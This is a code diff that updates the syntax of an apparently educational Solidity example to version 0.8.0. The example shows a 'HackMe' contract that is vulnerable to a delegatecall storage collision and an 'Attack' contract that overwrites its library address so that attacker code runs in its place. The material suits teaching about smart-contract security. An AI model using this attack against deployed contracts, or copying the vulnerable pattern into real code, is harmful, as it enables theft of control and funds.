@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.10;
+pragma solidity ^0.8.0;
 
 /*
 This is a more sophisticated version of the previous exploit.
@@ -33,7 +33,7 @@ contract HackMe {
     address public owner;
     uint public someNumber;
 
-    constructor(address _lib) public {
+    constructor(address _lib) {
         lib = _lib;
         owner = msg.sender;
     }
@@ -52,13 +52,13 @@ contract Attack {
 
     HackMe public hackMe;
 
-    constructor(HackMe _hackMe) public {
+    constructor(HackMe _hackMe) {
         hackMe = HackMe(_hackMe);
     }
 
     function attack() public {
         // override address of lib
-        hackMe.doSomething(uint(address(this)));
+        hackMe.doSomething(uint(uint160(address(this))));
         // pass any number as input, the function doSomething() below will
         // be called
         hackMe.doSomething(1);
